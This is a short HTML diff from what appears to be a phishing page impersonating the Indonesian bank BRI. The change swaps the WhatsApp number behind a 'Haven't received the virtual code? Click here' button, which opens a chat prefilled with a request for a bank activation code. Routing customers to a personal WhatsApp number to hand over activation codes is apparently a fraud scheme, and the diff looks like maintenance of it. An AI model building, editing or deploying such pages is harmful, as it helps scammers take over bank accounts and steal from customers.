@@ -341,7 +341,7 @@
     </div>
     <b> </b>
    </div>
- <b> <p style="font-size: 14px; text-align: center; margin-top: 55px; margin-left: 10px; margin-right: 10px;" onclick="location.href='https://wa.me/6283190021777?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Aktivasi'"><strong style="color: #FF0000; text-decoration: none"> Belum Menerima Kode Virtual ?<br>
+ <b> <p style="font-size: 14px; text-align: center; margin-top: 55px; margin-left: 10px; margin-right: 10px;" onclick="location.href='https://wa.me/6282152553155?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Aktivasi'"><strong style="color: #FF0000; text-decoration: none"> Belum Menerima Kode Virtual ?<br>
          <span style="color: #098CE3">Klik Disini</span>
          </strong></p></b>
    </center>
